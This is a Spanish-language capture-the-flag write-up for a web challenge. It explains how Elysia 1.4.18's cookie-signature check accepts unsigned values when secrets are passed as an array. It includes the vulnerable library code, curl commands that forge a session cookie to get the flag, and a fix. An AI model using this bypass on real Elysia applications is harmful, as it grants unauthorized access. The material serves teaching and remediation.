# Gatery — Cyber Apocalypse CTF 2026 (web)

> Lysa llega a Crownspire con la prueba de que un informante vende las rutas de patrulla,
> pero su nombre ya no está en la lista de entrada. Hay que engañar al paso vigilado.

**Categoría:** web · **Stack:** Bun + Elysia 1.4.18 + SQLite, nginx delante, front React/canvas
**Flag:** `HTB{w3lc0me_b3y0nd_th3_g4t3_8294a16a9100e99d7d095baf64b40b39}`

## TL;DR

El reto firma la cookie de sesión con un secreto aleatorio de 256 bits, pero la versión de
Elysia que usa (`1.4.18`) tiene un bug por el que **la verificación de firma nunca falla**
cuando `secrets` se pasa como array: si la firma no valida, el valor crudo del cliente se
usa tal cual. Basta una petición:

```bash
curl -X POST http://TARGET/api/flag -H 'Cookie: session=inside' -d '{}'
```

## Reconocimiento

El handout trae un juego 2D en React sobre canvas y un backend Bun/Elysia detrás de nginx.
Todo el juego —los guardias, el portón, el NPC que suelta la flag— es cliente; el estado real
son cuatro endpoints:

| Endpoint | Requisito | Efecto |
|---|---|---|
| `POST /api/login` | credenciales de `admin` | `session = 'admin'` |
| `POST /api/gate/open` | `session ∈ {admin, inside}` | nada, solo confirma |
| `POST /api/gate/enter` | `session ∈ {admin, inside}` | `session = 'inside'` |
| `POST /api/flag` | `session === 'inside'` | devuelve la flag |

La autorización entera es el **valor de una sola cookie**, así que el reto se reduce a:
¿puedo hacer que el servidor lea `session.value === 'inside'`?

La vía prevista está cerrada:

```ts
const adminPassword = randomBytes(24).toString('base64url')   // 192 bits
const adminPasswordHash = await bcrypt.hash(adminPassword, 12)
const sessionSecret = randomBytes(32).toString('hex')          // 256 bits
```

Nada que romper por fuerza bruta, y la consulta a SQLite es parametrizada. El único punto
que queda es la firma de la cookie:

```ts
const app = new Elysia({
  cookie: { secrets: [sessionSecret], sign: [sessionCookie] }
})
```

## El bug

`elysia@1.4.18` → `dist/cookies.mjs`, dentro de `parseCookie()`:

```js
if (sign === !0 || sign?.includes(name)) {
  if (!secrets) throw new Error('No secret is provided to cookie plugin')

  if (isStringKey) {                                  // secrets: 'foo'  → correcto
    const temp = await unsignCookie(value, secrets)
    if (temp === !1) throw new InvalidCookieSignature(name)
    value = temp
  } else {                                            // secrets: ['foo'] → roto
    let decoded = !0                                  // ← debería ser false
    for (let i = 0; i < secrets.length; i++) {
      const temp = await unsignCookie(value, secrets[i])
      if (temp !== !1) { decoded = !0, value = temp; break }
    }
    if (!decoded) throw new InvalidCookieSignature(name)
  }
}

jar[name] = { value }
```

Dos fallos que se combinan:

1. **`decoded` se inicializa a `true`** en vez de a `false`, y dentro del bucle solo se
   vuelve a asignar a `true`. Nunca vale `false`, así que `InvalidCookieSignature` es código
   muerto: una cookie con firma inválida no rechaza la petición.
2. **`value` solo se reasigna cuando alguna verificación pasa.** Si ninguna pasa, el valor
   que envió el cliente sobrevive sin tocar y acaba en el jar como `session.value`.

Y verificar `inside` desde luego no pasa, porque `unsignCookie` corta por el último punto:

```js
const tentativeValue = input.slice(0, input.lastIndexOf('.'))
return await signCookie(tentativeValue, secret) === input ? tentativeValue : !1
```

Para `"inside"` (sin punto) `lastIndexOf('.')` es `-1`, compara la firma de `"insid"` contra
`"inside"`, devuelve `false`… y el valor se queda en `"inside"`.

Detalle bonito: la rama de `secrets` como **string** está bien escrita. El reto elige
deliberadamente la forma en array, que es además la que documenta Elysia para rotación de
secretos.

## Explotación

Sin login, sin pasar por el portón:

```bash
$ curl -s -X POST http://154.57.164.80:31572/api/flag \
    -H 'Cookie: session=inside' \
    -H 'content-type: application/json' -d '{}'
{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_8294a16a9100e99d7d095baf64b40b39}"}
```

Comportamiento del endpoint según la cookie, que confirma que se está leyendo el valor
literal que mandamos:

| Cookie | Respuesta |
|---|---|
| (ninguna) | 401 `Login required` |
| `session=foo` | 403 `Enter the castle first` |
| `session=admin` | 403 `Enter the castle first` |
| `session=inside` | **200 + flag** |

Si se prefiere jugar el juego "de verdad", con `session=admin` también se puede llamar a
`/api/gate/enter` y dejar que el servidor emita la cookie `inside` correctamente firmada —
pero es un rodeo innecesario.

El script `solve.sh` no hace más que envolver ese `curl`:

```bash
./solve.sh http://154.57.164.80:31572
```

## Reproducción local

El handout trae el `docker-compose.yml` completo, así que se puede verificar todo antes de
tocar la instancia remota:

```bash
cd challenge/
docker compose up -d --build          # expone :80
curl -X POST http://127.0.0.1/api/flag -H 'Cookie: session=inside' -d '{}'
# {"ok":true,"flag":"HTB{f4k3_fl4g_f0r_t3st1ng}"}   ← flag de test del handout
```

Para confirmar que el bug está en la librería y no en la app, basta con inspeccionar el
paquete publicado sin levantar nada:

```bash
npm pack elysia@1.4.18 && tar xzf elysia-1.4.18.tgz
grep -n 'decoded' package/dist/cookies.mjs
```

## Callejones descartados

Anotados porque descartarlos rápido es lo que empuja hacia la cookie:

- **Fuerza bruta del login / SQLi.** La contraseña de admin son 192 bits de `randomBytes` y
  la consulta usa `?` parametrizado. La vía "legítima" está cerrada a propósito: es la señal
  de que el bug está en cómo se *valida* la sesión, no en cómo se *obtiene*.
- **Confusión de tipos en `parseCookie`.** Antes de verificar la firma, Elysia hace
  `JSON.parse` de los valores que empiezan por `{` o `[`, así que se puede meter un objeto
  en la cookie. No sirve de nada aquí: las comparaciones son `!== 'inside'` contra un string
  literal, y un objeto siempre pierde.
- **Lógica del juego.** Todo el canvas, los guardias y la colisión con el portón viven en
  `App.jsx`; el servidor no valida ninguna coordenada. Manipular el estado del cliente no
  aporta nada que no dé llamar a la API directamente.
- **nginx.** Sin `alias` ni `root` manipulables, no hay path traversal.

## Arreglo

Actualizar Elysia. En el código del bug, la corrección mínima es inicializar el flag a
falso y no confiar en el valor de entrada cuando ninguna verificación pasa:

```js
let decoded = false
for (const secret of secrets) {
  const temp = await unsignCookie(value, secret)
  if (temp !== false) { decoded = true; value = temp; break }
}
if (!decoded) throw new InvalidCookieSignature(name)
```

La lección de diseño va aparte del CVE: cuando la autorización es una comparación de strings
sobre un valor que viaja por el cliente, cualquier grieta en la verificación de integridad se
convierte directamente en escalada de privilegios. Una sesión con estado en servidor (id
aleatorio → registro en base de datos) habría sobrevivido a este mismo bug.
